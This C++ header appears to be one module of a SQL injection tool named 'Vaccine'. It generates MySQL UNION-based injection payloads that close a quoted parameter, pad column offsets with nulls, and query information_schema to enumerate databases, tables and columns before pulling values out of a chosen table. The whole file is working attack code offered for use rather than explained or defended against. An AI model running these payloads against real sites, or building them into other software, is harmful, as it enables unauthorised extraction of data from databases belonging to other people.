#ifndef MYSQL_UNION_BASED
#define MYSQL_UNION_BASED

#define OFFSET_LEN 6

#define UNION_BASED_OFFSET 0
#define UNION_BASED_DATABASE 1
#define UNION_BASED_TABLE 2
#define UNION_BASED_COLUMN 3

#include "../../Vaccine.hpp"

struct mysql_union_based
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                std::string offset;
                switch (type)
                {
                case DATABASES:
                        offset = *config[UNION_BASED_OFFSET];
                        *config[UNION_BASED_OFFSET] += "null, ";
                        return "' UNION SELECT " + offset + "schema_name " +
                               "FROM information_schema.schemata-- ";
                case TABLES:
                        if (config[UNION_BASED_OFFSET + 1] != NULL)
                        {
                                for (uint8 i = 0; i < OFFSET_LEN; ++i)
                                        config[UNION_BASED_OFFSET]->pop_back();
                                config[UNION_BASED_OFFSET + 1] = NULL;
                        }
                        return "' UNION SELECT " +
                               *config[UNION_BASED_OFFSET] + "table_name " +
                               "FROM information_schema.tables " +
                               "WHERE table_schema='" +
                               *config[UNION_BASED_DATABASE + 1] + "'-- ";
                case COLUMNS:
                        return "' UNION SELECT " +
                               *config[UNION_BASED_OFFSET] + "column_name " +
                               "FROM information_schema.columns " +
                               "WHERE table_schema='" +
                               *config[UNION_BASED_DATABASE] + "' " +
                               "AND table_name='" +
                               *config[UNION_BASED_TABLE] + "'-- ";
                case VALUES:
                        return "' UNION SELECT " +
                               *config[UNION_BASED_OFFSET] +
                               *config[UNION_BASED_COLUMN] + " " +
                               "FROM " + *config[UNION_BASED_DATABASE] + "." +
                               *config[UNION_BASED_TABLE] + "-- ";
                default:
                        return std::string();
                }
        };
};
#endif